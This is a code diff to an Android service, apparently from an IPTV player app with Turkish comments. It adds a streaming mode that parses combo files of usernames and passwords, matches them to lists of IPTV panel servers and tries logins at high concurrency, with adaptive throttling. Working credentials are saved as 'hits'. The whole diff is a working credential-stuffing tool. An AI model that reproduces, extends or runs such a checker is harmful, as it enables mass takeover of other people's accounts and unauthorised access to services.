@@ -6,8 +6,11 @@ import android.content.Context
 import android.os.Build
 import android.os.IBinder
 import android.os.Debug
+import android.net.Uri
 import android.app.ActivityManager
 import java.io.File
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -16,6 +19,8 @@ import java.util.concurrent.Executors
 import java.util.concurrent.ExecutorService
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.Semaphore
+import java.util.concurrent.ArrayBlockingQueue
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
 import java.util.concurrent.atomic.AtomicLong
@@ -47,6 +52,7 @@ class PanelScanService : Service() {
     const val ACTION_PAUSE = "expo.modules.panelscan.PAUSE"
     const val ACTION_RESUME = "expo.modules.panelscan.RESUME"
     const val ACTION_RECOVER = "expo.modules.panelscan.RECOVER"
+    const val ACTION_STREAM_FILE_V172 = "expo.modules.panelscan.STREAM_FILE_V172"
     const val PREFS = "gpt_elite_panel_scan"
     const val KEY_SNAPSHOT = "snapshot"
     const val KEY_EVENTS = "diagnostic_events"
@@ -289,8 +295,59 @@ class PanelScanService : Service() {
               )
             } else runUnifiedScan(payload,concurrency,timeoutMs,start)
           }
+          "streaming-file-v172" -> {
+            val o = JSONObject(payload)
+            runStreamingFileScanV172(
+              o.optString("uri"),
+              o.optString("directory", "[]"),
+              rec.optInt("requestedConcurrency", concurrency).coerceIn(1, 250),
+              rec.optInt("effectiveConcurrency", concurrency).coerceAtLeast(1),
+              timeoutMs,
+              rec.optInt("batchSize", 15).coerceIn(5, 15),
+              rec.optString("sourceFingerprint", ""),
+              rec.optInt("accountCursor", 0).toLong().coerceAtLeast(0L),
+            )
+          }
           else -> throw IllegalStateException("Bilinmeyen recovery modu: $mode")
         } }.start()
+      }
+      ACTION_STREAM_FILE_V172 -> {
+        val requestedRunId = intent.getStringExtra("runId") ?: ""
+        if (requestedRunId.isBlank() || requestedRunId != activeRunId() || running) return START_NOT_STICKY
+        currentRunId = requestedRunId
+        running = true
+        cancelled.set(false)
+        paused.set(false)
+        val uriText = intent.getStringExtra("uriText") ?: intent.data?.toString().orEmpty()
+        val directoryJson = intent.getStringExtra("directoryJson") ?: "[]"
+        val requestedConcurrency = intent.getIntExtra("requestedConcurrency", 32).coerceIn(1, 250)
+        val effectiveConcurrency = intent.getIntExtra("concurrency", requestedConcurrency).coerceIn(1, 64)
+        val batchSize = intent.getIntExtra("batchSize", 15).coerceIn(5, 15)
+        val sourceFingerprint = intent.getStringExtra("sourceFingerprint") ?: ""
+        val timeoutMs = intent.getIntExtra("timeoutMs", 8000).coerceIn(2000, 20000)
+        if (uriText.isBlank()) {
+          writeSnapshot(JSONObject().put("mode", "streaming-file-v172").put("runId", requestedRunId).put("running", false).put("error", "Dosya URI bulunamadı"))
+          running = false
+          releaseRun(requestedRunId)
+          return START_NOT_STICKY
+        }
+        val recoveryPayload = JSONObject().put("uri", uriText).put("directory", directoryJson).toString()
+        ScanJournalStore.get(applicationContext).createSessionV171(
+          requestedRunId, "streaming-file-v172", recoveryPayload, requestedConcurrency, effectiveConcurrency,
+          timeoutMs, 0L, batchSize, sourceFingerprint
+        )
+        writeSnapshot(JSONObject()
+          .put("mode", "streaming-file-v172").put("runId", requestedRunId).put("state", "RUNNING")
+          .put("running", true).put("paused", false).put("tested", 0).put("total", 0)
+          .put("accountTested", 0).put("accountTotal", 0).put("producerDone", false)
+          .put("queueDepth", 0).put("queueCapacity", maxOf(32, effectiveConcurrency * batchSize * 2))
+          .put("requestedConcurrency", requestedConcurrency).put("effectiveConcurrency", effectiveConcurrency)
+          .put("batchSize", batchSize).put("sourceFingerprint", sourceFingerprint.take(128))
+          .put("found", 0).put("matches", JSONArray()))
+        startForeground(NOTIF_ID, notification("Dosyadan canlı tarama başlıyor…", 0, 0))
+        Thread({
+          runStreamingFileScanV172(uriText, directoryJson, requestedConcurrency, effectiveConcurrency, timeoutMs, batchSize, sourceFingerprint, 0L)
+        }, "kizilkan-stream-v172-$requestedRunId").start()
       }
       ACTION_BULK_START -> {
         val requestedRunId = intent.getStringExtra("runId") ?: ""
@@ -611,6 +668,295 @@ class PanelScanService : Service() {
       while (keys.hasNext()) { val key = keys.next(); snap.put(key, extra.opt(key)) }
     }
     writeSnapshot(snap)
+  }
+
+
+  // v17.2.0: TXT/CSV satırları JS heap'ine yığılmadan native producer/consumer tarama.
+  private data class StreamAccountV172(
+    val ordinal: Long,
+    val row: Int,
+    val name: String,
+    val username: String,
+    val password: String,
+    val server: String,
+    val serverCode: String,
+    val panelName: String,
+  )
+
+  private fun normStreamKeyV172(v: String): String = v.trim().lowercase(java.util.Locale.forLanguageTag("tr"))
+    .replace('ı','i').replace('ş','s').replace('ğ','g').replace('ü','u').replace('ö','o').replace('ç','c')
+    .replace(Regex("[^a-z0-9]"), "")
+
+  private val streamUserKeysV172 = setOf("kullanici","kullaniciadi","user","username","login")
+  private val streamPassKeysV172 = setOf("sifre","parola","pass","password")
+  private val streamNameKeysV172 = setOf("ad","adi","isim","liste","listeadi","playlist","playlistname","name","displayname")
+  private val streamServerKeysV172 = setOf("sunucu","server","dns","url","host","portal")
+  private val streamCodeKeysV172 = setOf("kod","panelkodu","sunucukodu","servercode","code")
+  private val streamPanelKeysV172 = setOf("panel","paneladi","panelname")
+
+  private fun parseDelimitedV172(line: String, delimiter: Char): List<String> {
+    val out = ArrayList<String>(); val cur = StringBuilder(); var quoted = false; var i = 0
+    while (i < line.length) {
+      val ch = line[i]
+      if (ch == '"') {
+        if (quoted && i + 1 < line.length && line[i + 1] == '"') { cur.append('"'); i++ } else quoted = !quoted
+      } else if (ch == delimiter && !quoted) { out.add(cur.toString().trim()); cur.setLength(0) } else cur.append(ch)
+      i++
+    }
+    out.add(cur.toString().trim()); return out
+  }
+
+  private fun guessDelimiterV172(line: String): Char {
+    val choices = charArrayOf('\t','|',';',','); var best = '|'; var count = -1
+    for (d in choices) { val n = parseDelimitedV172(line, d).size; if (n > count) { count = n; best = d } }
+    return best
+  }
+
+  private fun headerLooksValidV172(values: List<String>): Boolean {
+    val keys = values.map(::normStreamKeyV172)
+    return keys.any { it in streamUserKeysV172 } && keys.any { it in streamPassKeysV172 }
+  }
+
+  private fun normalizeServerV172(value: String): String {
+    val v = value.trim().trimEnd('/')
+    return if (v.startsWith("http://", true) || v.startsWith("https://", true)) v else "http://$v"
+  }
+
+  private fun looksServerV172(v: String): Boolean =
+    Regex("^https?://", RegexOption.IGNORE_CASE).containsMatchIn(v) ||
+      Regex("^[a-z0-9.-]+:\\d+(?:/.*)?$", RegexOption.IGNORE_CASE).matches(v) ||
+      Regex("\\.[a-z]{2,}(?::\\d+)?(?:/|$)", RegexOption.IGNORE_CASE).containsMatchIn(v)
+
+  private fun parseStreamAccountV172(line: String, delimiter: Char, headers: List<String>?, row: Int, ordinal: Long): StreamAccountV172? {
+    if (headers == null && !line.contains(Regex("[|;\\t,]")) && !line.contains("://")) {
+      val i = line.indexOf(':')
+      if (i > 0 && i < line.length - 1) {
+        val u = line.substring(0, i).trim(); val p = line.substring(i + 1).trim()
+        if (u.isNotBlank() && p.isNotBlank() && !u.contains(' ')) return StreamAccountV172(ordinal,row,"",u,p,"","","")
+      }
+    }
+    val vals = parseDelimitedV172(line, delimiter)
+    if (headers != null) {
+      val obj = HashMap<String,String>()
+      headers.forEachIndexed { i, h -> obj[normStreamKeyV172(h)] = vals.getOrElse(i) { "" }.trim() }
+      fun first(keys: Set<String>) = keys.firstNotNullOfOrNull { key -> obj[key]?.takeIf { it.isNotBlank() } } ?: ""
+      val u = first(streamUserKeysV172); val p = first(streamPassKeysV172)
+      if (u.isBlank() || p.isBlank()) return null
+      val server = first(streamServerKeysV172)
+      return StreamAccountV172(ordinal,row,first(streamNameKeysV172),u,p,if (server.isBlank()) "" else normalizeServerV172(server),first(streamCodeKeysV172),first(streamPanelKeysV172))
+    }
+    val v = vals.map { it.trim() }; if (v.size < 2) return null
+    var name = ""; var u = ""; var p = ""; var locator = ""
+    if (v.size >= 4) { name=v[0]; u=v[1]; p=v[2]; locator=v[3] } else if (v.size == 3) { u=v[0]; p=v[1]; locator=v[2] } else { u=v[0]; p=v[1] }
+    if (u.isBlank() || p.isBlank()) return null
+    var server=""; var code=""; var panel=""
+    if (locator.isNotBlank()) {
+      if (looksServerV172(locator)) server = normalizeServerV172(locator)
+      else if (Regex("^\\d{2,12}$").matches(locator)) code = locator
+      else panel = locator
+    }
+    return StreamAccountV172(ordinal,row,name,u,p,server,code,panel)
+  }
+
+  private fun resolveCandidatesV172(account: StreamAccountV172, directory: JSONArray): List<JSONObject> {
+    if (account.server.isNotBlank()) return listOf(JSONObject().put("panelName", account.panelName).put("code", account.serverCode).put("server", account.server))
+    val out = ArrayList<JSONObject>()
+    val wantedPanel = account.panelName.trim().lowercase(java.util.Locale.forLanguageTag("tr"))
+    for (i in 0 until directory.length()) {
+      val item = directory.optJSONObject(i) ?: continue
+      val code = item.optString("code")
+      val panelName = item.optString("panelName")
+      val eligible = when {
+        account.serverCode.isNotBlank() -> code == account.serverCode
+        account.panelName.isNotBlank() -> code == account.panelName || panelName.trim().lowercase(java.util.Locale.forLanguageTag("tr")) == wantedPanel
+        else -> true
+      }
+      if (!eligible) continue
+      val hosts = item.optJSONArray("hosts") ?: JSONArray()
+      for (h in 0 until hosts.length()) {
+        val server = hosts.optString(h).trim()
+        if (server.isNotBlank()) out.add(JSONObject().put("panelName", panelName).put("code", code).put("server", server))
+      }
+    }
+    return out
+  }
+
+  private fun runStreamingFileScanV172(
+    uriText: String,
+    directoryRaw: String,
+    requestedConcurrency: Int,
+    initialEffectiveConcurrency: Int,
+    timeoutMs: Int,
+    batchSize: Int,
+    sourceFingerprint: String,
+    startAccountCursor: Long = 0L,
+  ) {
+    val journal = ScanJournalStore.get(applicationContext)
+    val directory = try { JSONArray(directoryRaw) } catch (_: Throwable) { JSONArray() }
+    val workerCount = computeEffectiveConcurrency(applicationContext, requestedConcurrency, batchSize)
+      .coerceAtMost(initialEffectiveConcurrency.coerceAtLeast(1)).coerceAtLeast(1)
+    // v17.2.0 adaptive scheduler: worker havuzu sabit üst sınıra sahip, ancak
+    // etkin worker sayısı queue basıncı ve son ağ sonuçlarına göre çalışma sırasında
+    // azaltılıp artırılır. Böylece thread churn olmadan backpressure korunur.
+    val adaptiveLimit = AtomicInteger(workerCount)
+    val adaptiveSuccess = AtomicInteger(0)
+    val adaptiveFailure = AtomicInteger(0)
+    val queueCapacity = maxOf(32, workerCount * batchSize * 2)
+    val queue = ArrayBlockingQueue<StreamAccountV172>(queueCapacity)
+    val producerDone = AtomicBoolean(false)
+    val producerFailure = AtomicReference<Throwable?>(null)
+    val produced = AtomicLong(0L)
+    val completed = AtomicLong(startAccountCursor)
+    val tested = AtomicLong(0L)
+    val matches = mutableListOf<JSONObject>()
+    val lastSnapshotAt = AtomicLong(0L)
+    val poison = StreamAccountV172(Long.MIN_VALUE, -1, "", "", "", "", "", "")
+    val tracker = ConservativeCursorTracker(workerCount)
+    val nextAssigned = AtomicLong(startAccountCursor)
+
+    try {
+      val oldResults = journal.results(currentRunId, 200)
+      for (i in 0 until oldResults.length()) oldResults.optJSONObject(i)?.let { matches.add(it) }
+      patchSnapshot { it.put("mode", "streaming-file-v172").put("producerDone", false).put("queueCapacity", queueCapacity)
+        .put("requestedConcurrency", requestedConcurrency).put("effectiveConcurrency", adaptiveLimit.get()).put("sourceFingerprint", sourceFingerprint.take(128)) }
+
+      val producer = Thread({
+        try {
+          val uri = Uri.parse(uriText)
+          val stream = contentResolver.openInputStream(uri) ?: throw IllegalArgumentException("Dosya akışı açılamadı")
+          var delimiter: Char? = null; var headers: List<String>? = null; var lineNo = 0; var validOrdinal = 0L
+          BufferedReader(InputStreamReader(stream, Charsets.UTF_8), 64 * 1024).use { reader ->
+            while (!cancelled.get()) {
+              while (paused.get() && !cancelled.get()) Thread.sleep(100)
+              val raw = reader.readLine() ?: break
+              lineNo++
+              val line = if (lineNo == 1) raw.removePrefix("\uFEFF").trim() else raw.trim()
+              if (line.isBlank() || line.startsWith("#")) continue
+              if (delimiter == null) {
+                if (line.startsWith("[") || line.startsWith("{") || line.contains("KIZILKAN PLAYER ELITE — HESAP ARŞİVİ", true))
+                  throw IllegalArgumentException("Yapılandırılmış JSON/arşiv biçimi streaming-file v17.2 yolunda desteklenmiyor")
+                delimiter = guessDelimiterV172(line)
+                val first = parseDelimitedV172(line, delimiter!!)
+                if (headerLooksValidV172(first)) { headers = first; continue }
+              }
+              val ordinal = validOrdinal++
+              if (ordinal < startAccountCursor) continue
+              val account = parseStreamAccountV172(line, delimiter!!, headers, lineNo, ordinal) ?: continue
+              while (!cancelled.get() && !queue.offer(account, 250, TimeUnit.MILLISECONDS)) {
+                patchSnapshot { it.put("queueDepth", queue.size).put("queueCapacity", queueCapacity).put("producerBackpressure", true) }
+              }
+              if (cancelled.get()) break
+              produced.incrementAndGet()
+              val now = System.currentTimeMillis()
+              val prev = lastSnapshotAt.get()
+              if (now - prev >= 500 && lastSnapshotAt.compareAndSet(prev, now)) {
+                patchSnapshot { it.put("accountTotal", startAccountCursor + produced.get()).put("queueDepth", queue.size).put("queueCapacity", queueCapacity).put("producerBackpressure", queue.remainingCapacity() == 0) }
+              }
+            }
+          }
+        } catch (e: Throwable) { producerFailure.compareAndSet(null, e) }
+        finally {
+          producerDone.set(true)
+          repeat(workerCount) {
+            while (!queue.offer(poison, 250, TimeUnit.MILLISECONDS) && !cancelled.get()) { }
+          }
+          patchSnapshot { it.put("producerDone", true).put("accountTotal", startAccountCursor + produced.get()).put("queueDepth", queue.size) }
+        }
+      }, "kizilkan-v172-producer")
+      producer.start()
+
+      val pool = Executors.newFixedThreadPool(workerCount)
+      activeExecutor = pool
+      repeat(workerCount) { workerId ->
+        pool.submit {
+          try {
+            while (!cancelled.get()) {
+              while ((paused.get() || workerId >= adaptiveLimit.get()) && !cancelled.get()) Thread.sleep(100)
+              val account = queue.poll(500, TimeUnit.MILLISECONDS) ?: if (producerDone.get()) break else continue
+              if (account.ordinal == Long.MIN_VALUE) break
+              tracker.begin(workerId, account.ordinal)
+              nextAssigned.updateAndGet { maxOf(it, account.ordinal + 1L) }
+              val candidates = resolveCandidatesV172(account, directory)
+              var foundForAccount = 0
+              for (candidate in candidates) {
+                if (cancelled.get()) break
+                while (paused.get() && !cancelled.get()) Thread.sleep(100)
+                val server = candidate.optString("server")
+                if (server.isBlank()) continue
+                val login = probe(server, account.username, account.password, timeoutMs)
+                val done = tested.incrementAndGet()
+                if (login != null) adaptiveSuccess.incrementAndGet() else adaptiveFailure.incrementAndGet()
+                if (done % 16L == 0L) {
+                  val ok = adaptiveSuccess.getAndSet(0)
+                  val fail = adaptiveFailure.getAndSet(0)
+                  val current = adaptiveLimit.get()
+                  val queuePressure = queue.size.toDouble() / queueCapacity.toDouble()
+                  val next = when {
+                    fail >= 12 && current > 1 -> maxOf(1, current - 1)
+                    queuePressure >= 0.70 && ok >= fail && current < workerCount -> minOf(workerCount, current + 1)
+                    else -> current
+                  }
+                  adaptiveLimit.set(next)
+                }
+                if (login != null) {
+                  val hit = JSONObject()
+                    .put("accountIndex", account.ordinal)
+                    .put("sourceRow", account.row)
+                    .put("username", account.username)
+                    .put("password", account.password)
+                    .put("name", account.name)
+                    .put("panelName", candidate.optString("panelName"))
+                    .put("code", candidate.optString("code"))
+                    .put("server", server)
+                    .put("login", sanitizeLogin(login))
+                  if (journal.addResult(currentRunId, "${account.ordinal}|$server", hit.toString())) {
+                    synchronized(matches) { matches.add(hit) }
+                    foundForAccount++
+                  }
+                }
+                val now = System.currentTimeMillis(); val prev = lastSnapshotAt.get()
+                if (login != null || now - prev >= 300L && lastSnapshotAt.compareAndSet(prev, now)) {
+                  writeUnifiedSnapshot(done, 0L, completed.get().toInt(), (startAccountCursor + produced.get()).toInt(), directory.length(), matches,
+                    candidate.optString("panelName"), account.ordinal.toInt(), true, server, null,
+                    JSONObject().put("streamingFile", true).put("producerDone", producerDone.get()).put("queueDepth", queue.size).put("queueCapacity", queueCapacity)
+                      .put("requestedConcurrency", requestedConcurrency).put("effectiveConcurrency", adaptiveLimit.get()).put("batchSize", batchSize)
+                      .put("sourceFingerprint", sourceFingerprint.take(128)).put("foundForAccount", foundForAccount))
+                }
+              }
+              completed.incrementAndGet()
+              tracker.finish(workerId)
+              val safe = tracker.safeCursor(nextAssigned.get())
+              journal.checkpointUnified(currentRunId, safe.toInt(), tested.get())
+            }
+          } catch (e: InterruptedException) { Thread.currentThread().interrupt() }
+          catch (e: Throwable) { producerFailure.compareAndSet(null, e) }
+          finally { tracker.finish(workerId) }
+        }
+      }
+      pool.shutdown()
+      while (!pool.isTerminated) {
+        if (cancelled.get()) pool.shutdownNow()
+        Thread.sleep(100)
+      }
+      producer.join(2000)
+      producerFailure.get()?.let { if (!cancelled.get()) throw it }
+      writeUnifiedSnapshot(tested.get(), tested.get(), completed.get().toInt(), (startAccountCursor + produced.get()).toInt(), directory.length(), matches,
+        "", -1, false, "", null,
+        JSONObject().put("streamingFile", true).put("producerDone", true).put("queueDepth", 0).put("queueCapacity", queueCapacity)
+          .put("requestedConcurrency", requestedConcurrency).put("effectiveConcurrency", adaptiveLimit.get()).put("batchSize", batchSize)
+          .put("sourceFingerprint", sourceFingerprint.take(128)))
+    } catch (e: Throwable) {
+      writeSnapshot(JSONObject().put("mode", "streaming-file-v172").put("runId", currentRunId).put("running", false)
+        .put("error", "${e.javaClass.simpleName}: ${e.message ?: "streaming file scan hatası"}"))
+      recordExternalDiagnostic(applicationContext, JSONObject().put("runId", currentRunId).put("mode", "streaming-file-v172").put("state", "V172_RUNTIME_FAILED")
+        .put("error", "${e.javaClass.simpleName}: ${e.message ?: ""}"))
+    } finally {
+      val finishedRunId = currentRunId
+      finalizeSnapshot("streaming-file-v172")
+      journal.finish(finishedRunId, try { JSONObject(getSharedPreferences(PREFS,0).getString(KEY_SNAPSHOT,"{}") ?: "{}").optString("state","FAILED") } catch (_:Throwable) { "FAILED" })
+      activeExecutor = null; activeConnections.clear(); running = false; releaseRun(finishedRunId)
+      stopForeground(STOP_FOREGROUND_REMOVE); stopSelf()
+    }
   }
 
   private fun runUnifiedScanFromStaging(
